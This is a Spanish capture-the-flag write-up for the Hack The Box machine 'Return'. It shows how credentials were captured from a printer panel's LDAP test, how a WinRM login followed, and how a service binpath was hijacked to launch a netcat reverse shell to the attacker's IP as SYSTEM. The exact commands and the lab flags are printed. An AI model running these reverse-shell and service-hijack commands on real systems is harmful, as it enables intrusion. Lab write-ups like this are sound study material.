---
tags:
  - asset/active-directory
  - env/windows
  - estado/completo
  - cert/oscp
plataforma: "[[Hack The Box]]"
web: https://app.hackthebox.com/machines/401
dificultad: Fácil
ip: 10.10.11.108
os: Windows
linked:
  - "[[sc.exe]]"
  - "[[Abusing Printer]]"
  - "[[Abusing Server Operators Group]]"
  - "[[Service Binary Path Hijacking]]"
---
# HackTheBox - Return

## Reconocimiento

Mi proceso de pentesting siempre comienza con una fase de reconocimiento exhaustiva. El objetivo es mapear la superficie de ataque del objetivo para identificar posibles puntos de entrada.

### Escaneo de Puertos

Inicié con un escaneo de puertos utilizando **Nmap** para descubrir los servicios que se estaban ejecutando en la máquina. Primero, realicé un escaneo rápido para identificar todos los puertos abiertos y luego uno más detallado sobre esos puertos para obtener información sobre las versiones de los servicios.
```Bash
sudo nmap -p- -sS --open --min-rate 3000 -vvv -n -Pn $(cat ip) -oG 01_Reconnaissance/tcpports

nmap -sCV -p53,80,88,135,139,389,445,464,593,636,3268,3269,5985,9389,47001,49664,49665,49666,49667,49671,49674,49675,49679,49682,49694  $(cat ip) --version-all --script-timeout 30s -oN 01_Reconnaissance/sCV
```

Los resultados revelaron una máquina Windows con tres servicios principales expuestos:
- **Puerto 80:** Microsoft IIS httpd 10.0 (Servidor Web)
- **Puerto 445:** Microsoft Windows Server 2008 R2 - 2012 smbd (SMB)
- **Puerto 5985:** Microsoft HTTPAPI httpd 2.0 (WinRM)
    
La presencia de **SMB** y **WinRM** confirmó que estaba tratando con un entorno Windows, probablemente parte de un dominio de Active Directory.

### Enumeración SMB (Puerto 445)

Mi siguiente paso fue investigar el servicio **SMB**. Utilicé `enum4linux` para intentar obtener información del dominio, usuarios y recursos compartidos.
```Bash
enum4linux -a 10.10.10.233
```

El escaneo confirmó que el host pertenecía al dominio **RETURN.local**. Sin embargo, los intentos de conexión con una sesión nula o de invitado fallaron, lo que significaba que no podría extraer más información por esta vía sin credenciales válidas. Decidí centrar mi atención en el servidor web.

### Enumeración Web (Puerto 80)

Al navegar a `http://10.10.10.233`, me encontré con lo que parecía ser un panel de administración de una impresora de red empresarial. Este tipo de paneles son conocidos por ser un punto débil en muchas redes corporativas.

Explorando la interfaz, encontré una sección de **"Settings"** o configuración. Dentro de esta sección, localicé una página para la configuración de **LDAP**, donde ya estaban autocompletados un nombre de usuario (`svc-printer`) y el dominio (`RETURN.local`).

> [!warning] Paneles de Administración Inseguros
> 
> Los paneles de administración de dispositivos de red como impresoras, switches o cámaras IP a menudo contienen configuraciones sensibles. Es común que permitan probar la conexión con servicios como LDAP o SMB, lo que puede ser abusado para filtrar las credenciales que tienen almacenadas.

## Explotación de vulnerabilidades

La configuración LDAP me dio la idea perfecta para mi vector de ataque. Si podía hacer que el panel se conectara a un servidor LDAP malicioso bajo mi control, podría capturar las credenciales que utiliza para autenticarse.

### Captura de Credenciales LDAP

El plan era simple: levantar un oyente en mi máquina en el puerto 389 (LDAP) y luego, en el panel de la impresora, cambiar la dirección del servidor LDAP a mi propia dirección IP.

1. **Levantar el oyente con Netcat:** En mi máquina de atacante, ejecuté el siguiente comando para escuchar conexiones entrantes en el puerto 389.
    ```Bash
    sudo nc -lvnp 389
    ```
    
2. **Activar la conexión desde el panel:** Volví al panel web de la impresora. En el campo "Server address" de la configuración LDAP, introduje la dirección IP de mi `tun0` y guardé los cambios o hice clic en un botón de "Test Connection".
    
Inmediatamente, recibí una conexión en mi oyente de `netcat`. El panel intentó autenticarse contra mi falso servidor LDAP, enviando las credenciales en texto plano.

```
... svc-printer:1edFg43012!! ...
```

¡Había obtenido las credenciales!
- **Usuario:** `svc-printer`
- **Contraseña:** `1edFg43012!!`
    

### Acceso Inicial con WinRM

Con un par de credenciales válidas y sabiendo por mi escaneo inicial que el puerto 5985 (WinRM) estaba abierto, el siguiente paso era obvio. Utilicé **Evil-WinRM** para obtener una shell remota en el servidor.
```Bash
evil-winrm -i 10.10.10.233 -u svc-printer -p '1edFg43012!!'
```

Con éxito, obtuve una sesión de PowerShell en la máquina como el usuario `svc-printer`.


---

## Escalada de privilegios

Una vez dentro de la máquina como el usuario `svc-printer`, mi objetivo principal era escalar privilegios para convertirme en `NT AUTHORITY\SYSTEM`.

### Análisis de Privilegios y Grupos

Mi primer paso en cualquier escenario de post-explotación es realizar una enumeración local exhaustiva. Comencé por verificar los privilegios específicos asignados a mi cuenta de usuario y los grupos a los que pertenecía.

Primero, examiné los privilegios con `whoami /priv`.
```PowerShell
*Evil-WinRM* PS C:\Users\svc-printer\desktop> whoami /priv

PRIVILEGES INFORMATION
----------------------

Privilege Name                  Description                          State
=============================   ===================================  =======
SeMachineAccountPrivilege       Add workstations to domain           Enabled
SeLoadDriverPrivilege           Load and unload device drivers       Enabled
SeSystemtimePrivilege           Change the system time               Enabled
SeBackupPrivilege               Back up files and directories        Enabled
SeRestorePrivilege              Restore files and directories        Enabled
SeShutdownPrivilege             Shut down the system                 Enabled
SeChangeNotifyPrivilege         Bypass traverse checking             Enabled
SeRemoteShutdownPrivilege       Force shutdown from a remote system  Enabled
SeIncreaseWorkingSetPrivilege   Increase a process working set       Enabled
SeTimeZonePrivilege             Change the time zone                 Enabled
```

La lista reveló varios privilegios interesantes. Tanto **`SeBackupPrivilege`** como **`SeLoadDriverPrivilege`** son vectores conocidos para la escalada de privilegios. Sin embargo, antes de explorar esas rutas, revisé la membresía de los grupos, que a menudo ofrece un camino más directo.
```PowerShell
*Evil-WinRM* PS C:\Users\svc-printer\desktop> whoami /groups

GROUP INFORMATION
-----------------

Group Name                                 Type             SID          Attributes
========================================== ================ ============ ==================================================
Everyone                                   Well-known group S-1-1-0      Mandatory group, Enabled by default, Enabled group
BUILTIN\Server Operators                   Alias            S-1-5-32-549 Mandatory group, Enabled by default, Enabled group
BUILTIN\Print Operators                    Alias            S-1-5-32-550 Mandatory group, Enabled by default, Enabled group
BUILTIN\Remote Management Users            Alias            S-1-5-32-580 Mandatory group, Enabled by default, Enabled group
BUILTIN\Users                              Alias            S-1-5-32-545 Mandatory group, Enabled by default, Enabled group
[...]
```

Inmediatamente, el grupo **`BUILTIN\Server Operators`** llamó mi atención.

> [!warning] El Peligro del Grupo "Server Operators"
> 
> Este es un grupo de alto privilegio. Sus miembros pueden realizar tareas administrativas críticas, como iniciar y detener servicios, configurar recursos compartidos de red y respaldar/restaurar archivos. La capacidad de modificar servicios es un vector de escalada de privilegios clásico y muy poderoso.

Este descubrimiento me dio un camino claro hacia `SYSTEM`. El plan era simple: secuestrar un servicio que se ejecute con privilegios elevados para que, en su lugar, ejecute mi propio payload.

### Abuso de Privilegios de Servicio

Decidí abusar de este privilegio para obtener una reverse shell. Primero, subí una copia de `nc64.exe` al directorio `C:\ProgramData`, que suele ser escribible por muchos usuarios.
```PowerShell
*Evil-WinRM* PS C:\programdata> upload /path/to/my/nc64.exe
Info: Uploading /path/to/my/nc64.exe to C:\programdata\nc64.exe
Info: Upload successful!
```

Aunque normalmente intentaría listar los servicios que mi usuario puede modificar, los intentos de consultar el Service Control Manager (`SCM`) fallaron por falta de permisos.
```PowerShell
*Evil-WinRM* PS C:\programdata> sc.exe query
[SC] OpenSCManager FAILED 5:

Access is denied.
```

Probé obtener información con otro comando y funcionó:
```bash
Get-Service VMTools | Format-List *
```

Usando `sc.exe`, modifiqué la ruta de su binario (`binpath`) para que apuntara a mi payload de Netcat.
```PowerShell
*Evil-WinRM* PS C:\programdata> sc.exe config VMTools binpath="C:\programdata\nc64.exe -e cmd 10.10.14.17 443"
[SC] ChangeServiceConfig SUCCESS
```

Con la configuración modificada, inicié el servicio. En mi máquina, levanté un oyente en el puerto 443.
```Bash
# En mi máquina de atacante
nc -lnvp 443
```

```PowerShell
# En la máquina víctima
*Evil-WinRM* PS C:\programdata> sc.exe stop VMTools
*Evil-WinRM* PS C:\programdata> sc.exe start VMTools
```

Recibí una conexión inmediatamente, ¡pero había un problema! La shell moría después de unos 30 segundos. Esto ocurre porque el SCM espera que el binario del servicio se comunique con él de una manera específica. Al no recibir la respuesta esperada, el SCM asume que el servicio ha fallado y termina el proceso.

### Obtención de una Shell Estable

Para solucionar la inestabilidad, utilicé una técnica para desacoplar mi shell del ciclo de vida del servicio. En lugar de ejecutar `nc64.exe` directamente, hice que el servicio ejecutara `cmd.exe`, que a su vez lanzaría mi payload como un proceso hijo.

> [!tip] Desacoplando Procesos para una Shell Estable
> 
> Al ejecutar cmd.exe /c [comando], el SCM inicia cmd.exe. Este, a su vez, ejecuta el comando (mi reverse shell) como un proceso separado y luego termina. El SCM mata el proceso cmd.exe al no recibir respuesta, pero el proceso de la reverse shell que este generó sigue vivo e independiente.

Modifiqué nuevamente la configuración del servicio `VMTools`:
```PowerShell
*Evil-WinRM* PS C:\programdata> sc.exe config VMTools binpath="C:\windows\system32\cmd.exe /c C:\programdata\nc64.exe -e cmd 10.10.14.6 443"
[SC] ChangeServiceConfig SUCCESS
```

Reinicié mi oyente y volví a iniciar el servicio. Esta vez, la shell que recibí fue completamente estable. Verifiqué mi identidad y confirmé que había logrado mi objetivo.
```Bash
# En mi máquina de atacante
$ nc -lnvp 443
Listening on 0.0.0.0 443
Connection received on 10.10.11.108 49757
Microsoft Windows [Version 10.0.17763.107]
(c) 2018 Microsoft Corporation. All rights reserved.

C:\Windows\system32>whoami
nt authority\system
```

Con una shell estable como `NT AUTHORITY\SYSTEM`, solo quedaba navegar al escritorio del Administrador y capturar la bandera final.


---

## Bandera(s)

> [!flag] `flag{user}`
> 530e690d7f6ad5d943015a4697b6618b
^bandera-user

> [!flag] `flag{root}`
> f2c50e59ea8140e3a3f435f0ee342d72
^bandera-root
